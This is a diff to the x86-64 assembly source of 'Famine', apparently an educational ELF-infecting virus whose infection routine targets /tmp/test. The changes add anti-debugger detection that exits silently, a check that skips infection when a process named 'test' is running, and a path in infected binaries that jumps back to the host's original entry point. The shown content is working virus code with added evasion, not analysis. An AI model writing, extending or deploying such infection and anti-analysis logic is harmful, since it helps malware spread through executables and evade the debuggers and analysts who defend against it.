@@ -1,5 +1,6 @@
 %include "include.s"
 %include "utils.s"
+%include "security_checks.s"
 %include "check_elf_64_exec.s"
 %include "list_files_recursive.s"
 
@@ -27,6 +28,9 @@ section .data
     msg_infected:         db "infected ", 0
     msg_already_infected: db "already infected", 10, 0
     proc_self_exe:        db "/proc/self/exe", 0
+    sec_proc_dir_path:    db "/proc/", 0
+    sec_proc_comm_path:   db "/comm", 0
+    sec_test_proc_name:   db "test", 10, 0  ; Process names in /proc/PID/comm end with newline
 
 section .text
 global _start
@@ -44,6 +48,14 @@ original_entry_storage:
     dq 0                        ; 8 bytes for original entry point
 
 _start:
+    ; ============================================
+    ; SECURITY CHECK 1: Anti-Debugger Detection
+    ; Exit immediately if debugger is detected
+    ; ============================================
+    call check_debugger
+    test rax, rax
+    jnz .exit_silently          ; If debugger detected, exit without doing anything
+    
     ; Save all registers we'll use
     push rbp
     mov rbp, rsp
@@ -66,6 +78,15 @@ _start:
 
     ; ===== ORIGINAL FAMINE BINARY EXECUTION PATH =====
     ; When running as original famine binary, use normal data sections
+    
+    ; ============================================
+    ; SECURITY CHECK 2: Check for "test" Process
+    ; Don't infect if a process named "test" is running
+    ; ============================================
+    call check_process_running
+    test rax, rax
+    jnz .skip_infection         ; If "test" process running, skip infection
+    
     mov qword [rel file_count], 0
     
     mov rsi, firstDir           ; source = /tmp/test
@@ -79,12 +100,28 @@ _start:
     mov rsi, [rel file_count]
     call check_elf64_exec
     
+.skip_infection:
     jmp _end
+
+.exit_silently:
+    ; Exit without doing anything (debugger detected)
+    mov eax, 60                 ; sys_exit
+    xor edi, edi                ; exit code 0
+    syscall
 
 .run_as_virus:
     ; ===== VIRUS EXECUTION PATH IN INFECTED BINARY =====
     ; We're running as the virus payload in an infected binary
     ; We need to use stack-based buffers and position-independent code
+    
+    ; ============================================
+    ; SECURITY CHECK 2: Check for "test" Process
+    ; Don't infect if a process named "test" is running
+    ; (Anti-debugger already checked at _start)
+    ; ============================================
+    call check_process_running
+    test rax, rax
+    jnz .virus_skip_infection   ; If "test" process running, skip to original entry
     
     ; The stored value is the offset from our _start to the original entry
     ; Calculate actual original entry: current_rip + stored_offset
@@ -124,6 +161,19 @@ _start:
     ; Stack layout from rbp: [saved_rbp][rbx][r12][r13][r14][r15][orig_entry]
     ; rbp points to saved_rbp, so orig_entry is at rbp-48 (6 items * 8 bytes)
     mov rax, [rbp - 48]         ; get original entry point we pushed earlier
+    jmp .virus_restore_and_jump
+
+.virus_skip_infection:
+    ; Skip infection, go directly to original entry point
+    ; Calculate original entry point
+    call .get_start_rip2
+.get_start_rip2:
+    pop rax                     ; rax = address of .get_start_rip2
+    sub rax, .get_start_rip2 - _start  ; rax = actual address of _start
+    add rax, [r15 + original_entry_storage - virus_start]
+    ; rax now contains original entry point
+
+.virus_restore_and_jump:
     
     ; Restore stack properly - just restore to the value at function entry
     pop rbp                     ; restore original rbp
